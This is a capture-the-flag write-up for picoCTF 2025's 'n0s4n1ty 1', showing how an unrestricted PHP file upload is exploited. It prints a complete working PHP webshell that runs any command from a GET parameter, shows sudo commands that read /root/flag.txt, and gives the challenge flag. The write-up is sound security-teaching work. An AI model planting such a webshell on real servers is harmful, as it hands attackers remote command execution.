---
title: "picoCTF 2025: n0s4n1ty 1"
tags:
  - ctf
date: 2025-03-17
---
# Problem
![[media/ctf/picoCTF/n0s4n1ty 1/description.png]]
# Solution
The website itself is quite simple:

![[upload_ui.png]]

Let's start by uploading a normal image just to see what's going on:

![[tux_upload.png]]

After uploading, we're told where our file can be found. We also see that the server is using PHP (see the URL):

![[tux_upload_confirm.png]]

Navigating to the aforementioned URL, we find our uploaded file as promised (this one is pretty cool, right?):

![[tux_uploaded.png]]

Now that's cool and all, but what else can we upload? Let's try a webshell. I'm not too familiar with PHP or webshells, but I found [this](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985) one to be simple and do the job just fine:

```php
<html>  
<body>  
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">  
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">  
<input type="SUBMIT" value="Execute">  
</form>  
<pre>  
<?php  
   if(isset($_GET['cmd']))  
   {  
       system($_GET['cmd'] . ' 2>&1');  
   }  
?>  
</pre>  
</body>  
</html>
```

So I saved this as `webshell.php`, and uploaded it:

![[webshell_upload.png]]

Apparently the server isn't picky about what file types can be uploaded:

![[webshell_upload_confirm.png]]

Navigating to our webshell, we have a simple text field and an "Execute" button:

![[webshell_uploaded.png]]

If we run `sudo ls /root`, we see a `flag.txt`:

![[webshell_ls_root.png]]

Then `sudo cat /root/flag.txt`:

![[webshell_cat_flag.png]]
## Flag
`picoCTF{wh47_c4n_u_d0_wPHP_5f3c22c0}`